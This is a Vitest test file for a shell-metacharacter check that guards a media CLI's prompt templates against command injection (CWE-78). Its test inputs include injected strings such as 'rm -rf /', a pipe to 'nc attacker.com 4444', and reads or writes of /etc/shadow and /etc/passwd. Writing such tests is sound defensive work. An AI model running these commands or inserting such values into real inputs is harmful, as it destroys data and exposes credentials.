import { describe, expect, it } from "vitest";
import { containsShellMetacharacters } from "./runner.entries.js";

describe("CWE-78: Command Injection in media-understanding CLI template context", () => {
  describe("containsShellMetacharacters", () => {
    it("should reject command substitution $()", () => {
      expect(containsShellMetacharacters("describe $(whoami) image")).toBe(true);
    });

    it("should reject backtick command substitution", () => {
      expect(containsShellMetacharacters("describe `id` image")).toBe(true);
    });

    it("should reject variable expansion ${}", () => {
      expect(containsShellMetacharacters("describe ${USER} image")).toBe(true);
    });

    it("should reject bare variable expansion $VAR", () => {
      expect(containsShellMetacharacters("describe $HOME/exploit")).toBe(true);
    });

    it("should reject shell command chaining &&", () => {
      expect(containsShellMetacharacters("describe image && rm -rf /")).toBe(true);
    });

    it("should reject shell operators ; | > <", () => {
      expect(containsShellMetacharacters("describe; whoami")).toBe(true);
      expect(containsShellMetacharacters("describe | nc attacker.com 4444")).toBe(true);
      expect(containsShellMetacharacters("describe > /etc/passwd")).toBe(true);
      expect(containsShellMetacharacters("describe < /etc/shadow")).toBe(true);
    });

    it("should accept normal prompt text", () => {
      expect(containsShellMetacharacters("Describe this image in detail")).toBe(false);
      expect(containsShellMetacharacters("What is shown in the photo?")).toBe(false);
      expect(containsShellMetacharacters("Transcribe the audio content")).toBe(false);
      expect(containsShellMetacharacters("Extract text from this document")).toBe(false);
    });
  });
});
